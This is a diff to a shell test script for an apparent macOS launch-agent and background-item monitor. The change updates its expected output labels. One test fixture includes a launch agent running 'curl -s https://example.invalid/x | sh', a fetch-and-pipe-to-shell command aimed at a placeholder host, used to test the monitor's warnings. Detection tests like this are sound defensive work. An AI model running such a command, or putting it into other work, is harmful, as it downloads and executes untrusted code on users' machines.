@@ -116,11 +116,11 @@ has() { grep -qF -- "$1" "$F/out"; }
 : > "$old"
 printf 'launch%s%s/Library/LaunchAgents/com.update.helper.plist%syou:staff:644%sabc\n' "$TAB" "$F" "$TAB" "$TAB" > "$new"
 desc full
-check "added agent: label, arguments, signer, interpreter warning" eval 'has "+ ADDED   Launch agent (user fx)" && has "runs     /bin/bash -c '"'"'curl -s https://example.invalid/x | sh'"'"'" && has "signer   Apple" && has "! starts bash"'
+check "added agent: label, arguments, signer, interpreter warning" eval 'has "+ ADDED   Launch agent (user fx)" && has "runs     /bin/bash -c '"'"'curl -s https://example.invalid/x | sh'"'"'" && has "program signed by  Apple (built into macOS)" && has "says nothing about who added it" && has "! starts bash"'
 
 printf 'btm%s501%sapp (0x2)|2.com.evil%s[2Jx|%s/.hidden/updater|%s/.hidden/updater\n' "$TAB" "$TAB" "$ESC" "$F" "$F" > "$new"
 desc full
-check "unsigned program in hidden folder: warnings" eval 'has "signer   UNSIGNED" && has "! not signed by an identified developer" && has "! runs from a temporary, shared or hidden folder"'
+check "unsigned program in hidden folder: warnings" eval 'has "program signed by  UNSIGNED" && has "! not signed by an identified developer" && has "! runs from a temporary, shared or hidden folder"'
 check "terminal escape codes are stripped"         eval '! grep -q "$ESC" "$F/out" && has "com.evil[2Jx"'
 
 printf 'btm%s501%sapp (0x2)|2.com.good|/Applications/Good.app|\n' "$TAB" "$TAB" > "$old"
